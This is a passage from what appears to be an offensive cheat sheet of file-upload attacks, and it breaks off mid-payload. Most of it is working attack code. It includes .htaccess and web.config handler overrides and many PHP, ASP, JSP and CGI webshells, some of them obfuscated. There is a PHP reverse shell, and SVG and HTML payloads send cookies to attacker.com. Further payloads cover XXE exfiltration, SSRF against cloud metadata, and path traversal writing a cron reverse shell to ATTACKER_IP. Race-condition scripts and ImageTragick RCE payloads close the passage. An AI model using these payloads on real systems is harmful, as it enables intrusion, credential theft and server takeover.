  echo 'AddType application/x-httpd-php .jpg' > .htaccess
  curl -X POST https://target.com/upload -F "file=@.htaccess" -b "session=COOKIE"

  # Then upload shell.jpg containing PHP code
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST https://target.com/upload -F "file=@shell.jpg" -b "session=COOKIE"

  # Access: https://target.com/uploads/shell.jpg?cmd=id

  # Payload 2: Make ALL files execute as PHP
  cat > .htaccess << 'EOF'
  AddHandler php-script .jpg .png .gif .txt
  EOF

  # Payload 3: Using SetHandler
  cat > .htaccess << 'EOF'
  SetHandler application/x-httpd-php
  EOF

  # Payload 4: Using AddHandler with specific extension
  cat > .htaccess << 'EOF'
  AddHandler application/x-httpd-php .evil
  EOF
  # Then upload shell.evil

  # Payload 5: PHP via FilesMatch
  cat > .htaccess << 'EOF'
  <FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  # Payload 6: PHP-FPM configuration
  cat > .htaccess << 'EOF'
  <FilesMatch ".*">
    SetHandler "proxy:fcgi://127.0.0.1:9000"
  </FilesMatch>
  EOF

  # Payload 7: CGI execution
  cat > .htaccess << 'EOF'
  Options +ExecCGI
  AddHandler cgi-script .jpg
  EOF

  # Payload 8: SSI execution
  cat > .htaccess << 'EOF'
  Options +Includes
  AddType text/html .jpg
  AddOutputFilter INCLUDES .jpg
  EOF
  # Then upload: <!--#exec cmd="id" -->

  # Payload 9: Override php_value to enable code execution
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file shell.jpg
  php_value auto_append_file shell.jpg
  EOF

  # Payload 10: Directory listing + execution
  cat > .htaccess << 'EOF'
  Options +Indexes
  AddType application/x-httpd-php .jpg
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="web.config (IIS)"}
  ```xml
  <!-- Upload web.config to enable ASP execution for .jpg files -->
  <!-- Payload 1: Handler mapping -->
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.jpg" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\system32\inetsrv\asp.dll"
             resourceType="Unspecified" requireAccess="Write" />
      </handlers>
    </system.webServer>
  </configuration>
  ```

  ```xml
  <!-- Payload 2: Execute ASPX via jpg -->
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="aspjpg" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".jpg" />
            <add fileExtension=".jpg" allowed="true" />
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  ```

  ```bash
  # Upload web.config
  curl -X POST https://target.com/upload \
    -F "file=@web.config;type=text/xml" \
    -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Other Config Files"}
  ```bash
  # .user.ini (PHP-FPM / CGI / FastCGI)
  # Works when Apache uses PHP-FPM instead of mod_php
  cat > .user.ini << 'EOF'
  auto_prepend_file=shell.jpg
  EOF
  # Upload .user.ini, then upload shell.jpg with PHP code
  # Any PHP file in the same directory will include shell.jpg first

  # Alternative .user.ini payloads
  cat > .user.ini << 'EOF'
  auto_append_file=shell.jpg
  EOF

  cat > .user.ini << 'EOF'
  auto_prepend_file="php://filter/convert.base64-decode/resource=shell.jpg"
  EOF
  # shell.jpg contains base64-encoded PHP

  # .phtml configuration
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .phtml
  EOF

  # Nginx config (if writable — rare)
  # /etc/nginx/conf.d/evil.conf or via path traversal
  cat > evil.conf << 'EOF'
  location ~ \.jpg$ {
      fastcgi_pass 127.0.0.1:9000;
      include fastcgi_params;
      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  }
  EOF
  ```
  :::
::

---

## Webshell Payloads

### PHP Webshells

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Minimal Shells"}
  ```php
  <?php system($_GET['cmd']); ?>

  <?php echo shell_exec($_GET['cmd']); ?>

  <?php passthru($_GET['cmd']); ?>

  <?php exec($_GET['cmd'], $o); echo implode("\n",$o); ?>

  <?php echo `$_GET[cmd]`; ?>

  <?=`$_GET[cmd]`?>

  <?php popen($_GET['cmd'],'r'); ?>

  <?php $a=$_GET['cmd'];$b=shell_exec($a);echo"<pre>$b</pre>"; ?>

  <!-- Shortest PHP shell -->
  <?=`{$_GET[c]}`?>

  <!-- Alternative short tags -->
  <%system($_GET['cmd']);%>
  <script language="php">system($_GET['cmd']);</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Obfuscated Shells"}
  ```php
  <!-- Base64 encoded execution -->
  <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

  <!-- String concatenation -->
  <?php $a='sys'.'tem'; $a($_GET['cmd']); ?>

  <!-- Variable variables -->
  <?php $x='system'; $$x=$x; $$x($_GET['cmd']); ?>

  <!-- chr() obfuscation -->
  <?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['cmd']); ?>

  <!-- Array-based obfuscation -->
  <?php $a=array('s','y','s','t','e','m');$b=implode('',$a);$b($_GET['cmd']); ?>

  <!-- Hex encoding -->
  <?php $a="\x73\x79\x73\x74\x65\x6d"; $a($_GET['cmd']); ?>

  <!-- str_rot13 -->
  <?php $a=str_rot13('flfgrz'); $a($_GET['cmd']); ?>

  <!-- Assert-based (PHP < 8.0) -->
  <?php assert($_GET['cmd']); ?>

  <!-- preg_replace with /e modifier (PHP < 7.0) -->
  <?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>

  <!-- create_function (deprecated but may work) -->
  <?php $f=create_function('','system($_GET["cmd"]);');$f(); ?>

  <!-- call_user_func -->
  <?php call_user_func('system',$_GET['cmd']); ?>

  <!-- usort-based -->
  <?php usort($_GET,'sy'.'st'.'em'); ?>

  <!-- Dynamic function call via variable -->
  <?php $_GET['a']($_GET['b']); ?>
  <!-- Usage: ?a=system&b=id -->

  <!-- Backtick operator with variable -->
  <?php echo `{$_REQUEST['cmd']}`; ?>

  <!-- GIF header + obfuscated shell -->
  GIF89a<?php $x=base64_decode('c3lzdGVt');$x($_GET['c']);?>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced Shells"}
  ```php
  <!-- File manager shell -->
  <?php
  if(isset($_GET['cmd'])){
    echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
  }
  if(isset($_GET['read'])){
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['read']))."</pre>";
  }
  if(isset($_POST['write']) && isset($_POST['content'])){
    file_put_contents($_POST['write'],$_POST['content']);
    echo "Written!";
  }
  if(isset($_GET['download'])){
    header('Content-Disposition: attachment; filename='.basename($_GET['download']));
    readfile($_GET['download']);
    exit;
  }
  ?>
  <!-- Usage:
    ?cmd=id
    ?read=/etc/passwd
    POST write=/tmp/test.txt&content=hello
    ?download=/etc/passwd
  -->

  <!-- Reverse shell via upload -->
  <?php
  $ip = '10.10.14.1';  // Your IP
  $port = 4444;
  $sock = fsockopen($ip, $port);
  $proc = proc_open('/bin/bash', array(
    0 => $sock,
    1 => $sock, 
    2 => $sock
  ), $pipes);
  ?>

  <!-- PHP info disclosure -->
  <?php phpinfo(); ?>

  <!-- Disable function bypass via mail() -->
  <?php
  // If system/exec/shell_exec are disabled
  // Check: ini_get('disable_functions')
  mail('','','','','-OQueueDirectory=/tmp -X/var/www/html/shell.php');
  // Then write PHP code to /var/www/html/shell.php via SMTP log
  ?>
  ```
  :::
::

### Other Language Webshells

::code-group
```asp [ASP Classic]
<% eval request("cmd") %>

<%
Set oShell = Server.CreateObject("WScript.Shell")
Set oExec = oShell.Exec("cmd /c " & Request("cmd"))
Response.Write(oExec.StdOut.ReadAll())
%>

<%
Dim cmd
cmd = Request("cmd")
Set shell = CreateObject("WScript.Shell")
Set exec = shell.Exec("cmd.exe /c " & cmd)
Response.Write exec.StdOut.ReadAll()
%>
```

```aspx [ASP.NET (ASPX)]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

```jsp [JSP]
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
  out.println(line);
}
%>
```

```python [Python (CGI)]
#!/usr/bin/env python3
import subprocess, cgi
print("Content-Type: text/html\n")
params = cgi.FieldStorage()
cmd = params.getvalue('cmd', 'id')
print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
```

```perl [Perl (CGI)]
#!/usr/bin/perl
use CGI;
my $q = CGI->new;
print $q->header('text/html');
my $cmd = $q->param('cmd') || 'id';
print "<pre>" . `$cmd` . "</pre>";
```
::

---

## XSS via File Upload

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SVG XSS"}
  ```xml
  <!-- Basic SVG XSS -->
  <?xml version="1.0" standalone="no"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  </svg>

  <!-- SVG with script tag -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>

  <!-- SVG with event handler -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onmouseover="alert(1)"/>
  </svg>

  <!-- SVG foreignObject XSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject>
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert(document.domain)"></iframe>
      </body>
    </foreignObject>
  </svg>

  <!-- SVG animate XSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
  </svg>

  <!-- SVG set XSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <set attributeName="onmouseover" to="alert(1)"/>
  </svg>

  <!-- SVG use + external reference -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
  </svg>

  <!-- SVG with fetch for cookie stealing -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)">
  </svg>
  ```

  ```bash
  # Upload SVG
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/svg+xml" \
    -b "session=COOKIE"

  # Check if served with dangerous Content-Type
  curl -sI https://target.com/uploads/xss.svg | grep -i content-type
  # Vulnerable if: Content-Type: image/svg+xml (renders in browser)
  # Safe if: Content-Type: application/octet-stream or Content-Disposition: attachment
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTML XSS"}
  ```html
  <!-- Basic HTML XSS file -->
  <html>
  <body>
  <script>alert(document.domain)</script>
  </body>
  </html>

  <!-- HTML with cookie stealing -->
  <html>
  <body>
  <script>
  new Image().src="https://attacker.com/steal?c="+document.cookie;
  </script>
  </body>
  </html>

  <!-- HTML disguised as image -->
  <!-- Save as xss.html or rename to xss.jpg and hope server serves with text/html -->
  <html>
  <body>
  <img src=x onerror="alert(document.domain)">
  </body>
  </html>

  <!-- XHTML XSS -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
  <html xmlns="http://www.w3.org/1999/xhtml">
  <body onload="alert(document.domain)">
  </body>
  </html>
  ```

  ```bash
  # Upload HTML
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;type=text/html" -b "session=COOKIE"

  # Try disguised extensions
  cp xss.html xss.html.jpg
  cp xss.html xss.htm
  cp xss.html xss.xhtml
  cp xss.html xss.shtml

  for f in xss.html xss.html.jpg xss.htm xss.xhtml xss.shtml; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f" -b "session=COOKIE")
    echo "$f -> $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Other XSS Vectors"}
  ```bash
  # XML XSS
  cat > xss.xml << 'EOF'
  <?xml version="1.0"?>
  <?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform' version='1.0'><xsl:template match='/'><script xmlns='http://www.w3.org/1999/xhtml'>alert(1)</script></xsl:template></xsl:stylesheet>"?>
  <root/>
  EOF

  # CSS injection via uploaded stylesheet
  cat > xss.css << 'EOF'
  body {
    background: url("javascript:alert(1)");
  }
  input[value^="a"] {
    background: url("https://attacker.com/leak?char=a");
  }
  EOF

  # XSS via filename (if filename is reflected)
  # Set filename to: <img src=x onerror=alert(1)>.jpg
  curl -X POST https://target.com/upload \
    -F 'file=@test.jpg;filename="><img src=x onerror=alert(1)>.jpg' \
    -b "session=COOKIE"

  # XSS via uploaded PDF (JavaScript in PDF)
  python3 << 'PDFEOF'
  pdf = b"""%PDF-1.4
  1 0 obj
  << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
  endobj
  2 0 obj
  << /Type /Pages /Kids [3 0 R] /Count 1 >>
  endobj
  3 0 obj
  << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
  endobj
  4 0 obj
  << /Type /Action /S /JavaScript /JS (app.alert('XSS')) >>
  endobj
  xref
  0 5
  trailer
  << /Size 5 /Root 1 0 R >>
  startxref
  0
  %%EOF"""

  with open('xss.pdf', 'wb') as f:
      f.write(pdf)
  PDFEOF
  ```
  :::
::

---

## XXE via File Upload

::note
Many file formats are XML-based internally. Uploading crafted versions can trigger XXE (XML External Entity) injection.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SVG XXE"}
  ```xml
  <!-- SVG XXE — Read /etc/passwd -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- SVG XXE — SSRF -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- SVG XXE — Blind/OOB -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&send;</text>
  </svg>

  <!-- evil.dtd on attacker server -->
  <!-- 
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  -->
  ```

  ```bash
  # Upload SVG XXE
  curl -X POST https://target.com/upload \
    -F "file=@xxe.svg;type=image/svg+xml" -b "session=COOKIE"

  # Start listener for OOB XXE
  python3 -m http.server 8888
  # or
  nc -lvnp 8888
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="DOCX/XLSX/PPTX XXE"}
  ```bash
  # Office files (DOCX, XLSX, PPTX) are ZIP archives containing XML files
  # Inject XXE into internal XML files

  # Step 1: Create or copy a legitimate DOCX
  cp legit.docx evil.docx

  # Step 2: Extract
  mkdir docx_extracted
  cd docx_extracted
  unzip ../evil.docx

  # Step 3: Inject XXE into [Content_Types].xml
  cat > '[Content_Types].xml' << 'XXEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/word/xxe" ContentType="&xxe;"/>
  </Types>
  XXEOF

  # Alternative: Inject into word/document.xml
  # Add <!ENTITY xxe SYSTEM "file:///etc/passwd"> and reference &xxe; in content

  # Step 4: Repack
  zip -r ../evil_xxe.docx .

  # Step 5: Upload
  curl -X POST https://target.com/upload \
    -F "file=@evil_xxe.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
    -b "session=COOKIE"

  # Same technique for XLSX
  # Inject into xl/sharedStrings.xml or xl/workbook.xml

  # Same technique for PPTX
  # Inject into ppt/presentation.xml
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Other XML Formats"}
  ```bash
  # XML file upload XXE
  cat > xxe.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>
  EOF

  # XLF (XLIFF translation file) XXE
  cat > xxe.xlf << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <xliff version="1.2">
    <file source-language="en">
      <body>
        <trans-unit id="1">
          <source>&xxe;</source>
        </trans-unit>
      </body>
    </file>
  </xliff>
  EOF

  # GPX (GPS data) XXE
  cat > xxe.gpx << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <gpx version="1.1">
    <wpt lat="0" lon="0">
      <name>&xxe;</name>
    </wpt>
  </gpx>
  EOF

  # RSS/Atom feed XXE
  cat > xxe.rss << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <rss version="2.0">
    <channel>
      <title>&xxe;</title>
    </channel>
  </rss>
  EOF

  # XSLT XXE/RCE
  cat > xxe.xsl << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:value-of select="'&xxe;'"/>
    </xsl:template>
  </xsl:stylesheet>
  EOF
  ```
  :::
::

---

## SSRF via File Upload

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SVG SSRF"}
  ```xml
  <!-- SVG with external image reference (SSRF) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
  </svg>

  <!-- SVG with external stylesheet (SSRF) -->
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet href="http://169.254.169.254/latest/meta-data/" type="text/css"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100"/>
  </svg>

  <!-- SVG with external font (SSRF) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <defs>
      <font-face font-family="evil">
        <font-face-src>
          <font-face-uri xlink:href="http://attacker.com/ssrf"/>
        </font-face-src>
      </font-face>
    </defs>
    <text font-family="evil">test</text>
  </svg>

  <!-- SVG foreignObject SSRF -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject>
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PDF SSRF"}
  ```bash
  # PDF with external annotation (SSRF when server renders/processes PDF)
  python3 << 'PDFEOF'
  pdf = b"""%PDF-1.4
  1 0 obj
  << /Type /Catalog /Pages 2 0 R >>
  endobj
  2 0 obj
  << /Type /Pages /Kids [3 0 R] /Count 1 >>
  endobj
  3 0 obj
  << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
     /Annots [4 0 R] >>
  endobj
  4 0 obj
  << /Type /Annot /Subtype /Link /Rect [0 0 612 792]
     /A << /Type /Action /S /URI /URI (http://169.254.169.254/latest/meta-data/) >> >>
  endobj
  xref
  0 5
  trailer << /Size 5 /Root 1 0 R >>
  startxref
  0
  %%EOF"""

  with open('ssrf.pdf', 'wb') as f:
      f.write(pdf)
  PDFEOF

  # HTML-to-PDF SSRF (when server converts HTML to PDF)
  cat > ssrf.html << 'EOF'
  <html>
  <body>
  <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
  <img src="http://169.254.169.254/latest/user-data">
  <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
  <script src="http://169.254.169.254/latest/meta-data/"></script>
  </body>
  </html>
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cloud Metadata Targets"}
  ```bash
  # AWS metadata endpoints
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/user-data
  http://169.254.169.254/latest/meta-data/hostname
  http://169.254.169.254/latest/meta-data/local-ipv4

  # AWS IMDSv2 (requires token)
  # Usually not exploitable via simple SSRF

  # GCP metadata
  http://169.254.169.254/computeMetadata/v1/
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

  # Azure metadata
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

  # DigitalOcean
  http://169.254.169.254/metadata/v1/

  # Internal services
  http://127.0.0.1:8080
  http://localhost:3000
  http://0.0.0.0:8443
  http://[::1]:8080
  ```
  :::
::

---

## Path Traversal via Upload

::warning
If the application allows controlling the upload path or filename, you can write files to arbitrary locations on the server.
::

::code-group
```bash [Filename Path Traversal]
# Overwrite files via filename manipulation in Burp Suite
# Modify filename in Content-Disposition header

# Basic traversal
Content-Disposition: form-data; name="file"; filename="../../../etc/cron.d/evil"
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"

# Windows traversal
Content-Disposition: form-data; name="file"; filename="..\\..\\..\\inetpub\\wwwroot\\shell.aspx"

# URL-encoded traversal
Content-Disposition: form-data; name="file"; filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"

# Double URL-encoded
Content-Disposition: form-data; name="file"; filename="..%252f..%252f..%252fshell.php"

# Unicode encoded
Content-Disposition: form-data; name="file"; filename="..%c0%af..%c0%afshell.php"
Content-Disposition: form-data; name="file"; filename="..%ef%bc%8f..%ef%bc%8fshell.php"

# Null byte + traversal
Content-Disposition: form-data; name="file"; filename="../../../shell.php%00.jpg"

# Overwrite authorized_keys for SSH access
Content-Disposition: form-data; name="file"; filename="../../../../root/.ssh/authorized_keys"
# File content: your SSH public key

# Overwrite crontab for reverse shell
Content-Disposition: form-data; name="file"; filename="../../../../etc/cron.d/reverse"
# File content: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

```bash [curl Path Traversal]
# Upload with traversal filename
curl -X POST https://target.com/upload \
  -F 'file=@shell.php;filename=../../../var/www/html/shell.php' \
  -b "session=COOKIE" -v

# URL-encoded traversal
curl -X POST https://target.com/upload \
  -F 'file=@shell.php;filename=..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php' \
  -b "session=COOKIE" -v

# Overwrite .htaccess in parent directory
curl -X POST https://target.com/upload \
  -F 'file=@.htaccess;filename=../.htaccess' \
  -b "session=COOKIE" -v

# Python script for automated traversal testing
python3 << 'TRAVEOF'
import requests

url = "https://target.com/upload"
cookies = {"session": "COOKIE"}

traversals = [
    "../shell.php",
    "../../shell.php",
    "../../../shell.php",
    "../../../../shell.php",
    "../../../var/www/html/shell.php",
    "..\\shell.php",
    "..\\..\\shell.php",
    "..%2fshell.php",
    "..%2f..%2fshell.php",
    "..%252fshell.php",
    "..%c0%afshell.php",
    "%2e%2e/shell.php",
    "%2e%2e%2fshell.php",
    "....//shell.php",
    "....\\\\shell.php",
]

shell_content = b'<?php echo "PATH_TRAVERSAL_SUCCESS"; ?>'

for path in traversals:
    files = {"file": (path, shell_content, "application/octet-stream")}
    r = requests.post(url, files=files, cookies=cookies)
    print(f"{path} -> {r.status_code} | {r.text[:100]}")
TRAVEOF
```

```bash [Target Overwrite Files]
# Critical files to overwrite for RCE
/var/www/html/shell.php              # Direct webshell
/var/www/html/.htaccess              # Apache config
/var/www/html/web.config             # IIS config
/etc/cron.d/evil                     # Cron job
/root/.ssh/authorized_keys           # SSH access
/home/user/.ssh/authorized_keys      # SSH access
/etc/nginx/sites-enabled/evil.conf   # Nginx config
/etc/apache2/sites-enabled/evil.conf # Apache config
/proc/self/environ                   # Read-only but test
/tmp/shell.php                       # Temp execution
~/.bashrc                            # Shell init
~/.profile                           # Shell init
```
::

---

## Race Condition Attacks

::tip
Some applications upload the file first, then validate and delete it. The window between upload and deletion is exploitable.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Race Condition Exploit"}
  ```bash
  # Strategy: Upload malicious file + access it before server deletes it

  # Terminal 1: Continuously upload the shell
  while true; do
    curl -s -X POST https://target.com/upload \
      -F "file=@shell.php;type=image/jpeg" \
      -b "session=COOKIE" > /dev/null
  done

  # Terminal 2: Continuously try to access the shell
  while true; do
    RESPONSE=$(curl -s https://target.com/uploads/shell.php?cmd=id)
    if echo "$RESPONSE" | grep -q "uid="; then
      echo "SUCCESS: $RESPONSE"
      break
    fi
  done

  # Python race condition script (more efficient)
  python3 << 'RACEEOF'
  import requests
  import threading
  import time

  URL_UPLOAD = "https://target.com/upload"
  URL_SHELL = "https://target.com/uploads/shell.php"
  COOKIES = {"session": "COOKIE"}
  SUCCESS = False

  def upload_loop():
      global SUCCESS
      shell = open("shell.php", "rb").read()
      while not SUCCESS:
          try:
              files = {"file": ("shell.php", shell, "image/jpeg")}
              requests.post(URL_UPLOAD, files=files, cookies=COOKIES, timeout=2)
          except:
              pass

  def access_loop():
      global SUCCESS
      while not SUCCESS:
          try:
              r = requests.get(URL_SHELL, params={"cmd": "id"}, timeout=2)
              if "uid=" in r.text:
                  print(f"[+] RACE WON! Response: {r.text[:200]}")
                  SUCCESS = True
                  return
          except:
              pass

  # Start multiple upload and access threads
  threads = []
  for _ in range(10):
      threads.append(threading.Thread(target=upload_loop))
      threads.append(threading.Thread(target=access_loop))

  for t in threads:
      t.start()

  for t in threads:
      t.join(timeout=60)

  if not SUCCESS:
      print("[-] Race condition not exploitable within timeout")
  RACEEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Turbo Intruder (Burp)"}
  ```python
  # Burp Suite Turbo Intruder script for race condition
  # Extensions → Turbo Intruder → Send to Turbo Intruder

  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=20,
                              requestsPerConnection=100,
                              pipeline=True)
      
      # Upload request (modify as needed)
      upload_req = '''POST /upload HTTP/1.1
  Host: target.com
  Cookie: session=COOKIE
  Content-Type: multipart/form-data; boundary=----boundary

  ------boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg

  <?php system($_GET['cmd']); ?>
  ------boundary--'''
      
      # Access request
      access_req = '''GET /uploads/shell.php?cmd=id HTTP/1.1
  Host: target.com
  Cookie: session=COOKIE

  '''
      
      # Send interleaved requests
      for i in range(200):
          engine.queue(upload_req, gate='race')
          engine.queue(access_req, gate='race')
      
      # Open gate (send all at once)
      engine.openGate('race')

  def handleResponse(req, interesting):
      if 'uid=' in req.response:
          table.add(req)
  ```
  :::
::

---

## Image Processing Exploits

::accordion
  :::accordion-item{icon="i-lucide-image" label="ImageMagick Exploits (ImageTragick)"}
  ```bash
  # CVE-2016-3714 (ImageTragick) — RCE via image processing
  # Affects ImageMagick < 6.9.3-10 / 7.x < 7.0.1-1

  # Payload 1: MVG format RCE
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.1/test.jpg"|id > /tmp/pwned")'
  pop graphic-context
  EOF

  # Payload 2: SVG format RCE
  cat > exploit.svg << 'EOF'
  <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="640px" height="480px">
  <image xlink:href="https://127.0.0.1/test.jpg&quot;|id > /tmp/pwned&quot;"
   x="0" y="0" height="640px" width="480px"/>
  </svg>
  EOF

  # Payload 3: Ephemeral protocol RCE
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral://|id > /tmp/pwned'
  pop graphic-context
  EOF

  # Payload 4: MSL (ImageMagick Scripting Language)
  cat > exploit.msl << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="ephemeral://|id > /tmp/pwned"/>
  </image>
  EOF

  # Payload 5: Reverse shell via ImageMagick
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
